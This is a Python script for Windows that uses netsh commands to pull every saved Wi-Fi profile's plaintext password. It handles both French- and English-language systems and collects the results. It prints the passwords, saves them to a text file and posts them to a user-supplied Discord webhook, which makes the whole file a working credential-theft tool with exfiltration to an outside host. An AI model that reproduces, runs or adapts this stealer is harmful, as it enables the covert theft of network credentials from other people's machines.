import subprocess, re, requests

# Settings ----------------------------
# Enable console printing
console = True
# Enable saving to file
file_save = True
# Filename path if file saving is enabled
name = 'wifi.txt'
# Enable sending to Discord webhook
discord = True
# Link of your Discord channel webhook
webhook = ''
# --------------------------------------

data = []
cmd = subprocess.Popen(('netsh', 'wlan', 'show', 'profiles'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
output = (cmd.stdout.read() + cmd.stderr.read()).decode('CP850')
if re.search("Profils utilisateurs", output):
    wifi_names = (re.findall("Profil Tous les utilisateurs     : (.*)\r", output))
    for wifi in wifi_names:
        try:
            cmd = subprocess.Popen(('netsh', 'wlan', 'show', 'profiles', wifi),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read()).decode('CP850')
            if re.search("Clé de sécurité        : Absent", output):
                data.append(f'{wifi} : [Absent]')
            else:
                cmd = subprocess.Popen(('netsh', 'wlan', 'show', 'profiles', wifi, 'key=clear'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                output = (cmd.stdout.read() + cmd.stderr.read()).decode('CP850')
                psswrd = re.search("Contenu de la clé            : (.*)\r", output)
                if psswrd == None:
                    data.append(f'{wifi} : [None]')
                else:
                    data.append(f'{wifi} : {psswrd[1]}')
            if console ==  True:
                print(data[-1])
        except:
            continue
elif re.search("User profiles", output):
    wifi_names = (re.findall("All User Profile     : (.*)\r", output))
    for wifi in wifi_names:
        try:
            cmd = subprocess.Popen(('netsh', 'wlan', 'show', 'profiles', wifi),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read()).decode('CP850')
            if re.search("Security key           : Absent", output):
                data.append(f'{wifi} : [Absent]')
            else:
                cmd = subprocess.Popen(('netsh', 'wlan', 'show', 'profiles', wifi, 'key=clear'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                output = (cmd.stdout.read() + cmd.stderr.read()).decode('CP850')
                psswrd = re.search("Key Content            : (.*)\r", output)
                if psswrd == None:
                    data.append(f'{wifi} : [None]')
                else:
                    data.append(f'{wifi} : {psswrd[1]}')
            if console ==  True:
                print(data[-1])
        except:
            continue
else:
    print('ERROR: CMD not compatible')
    quit()
if file_save == True:
    file = open(name, "w")
    file.write('\n')
json = {'content': ''}
for i in data:
    if file_save == True:
        file.write(f'{i}\r')
    if discord == True:
        json['content'] += i+'\n'
if discord == True:
    requests.post(webhook, json)
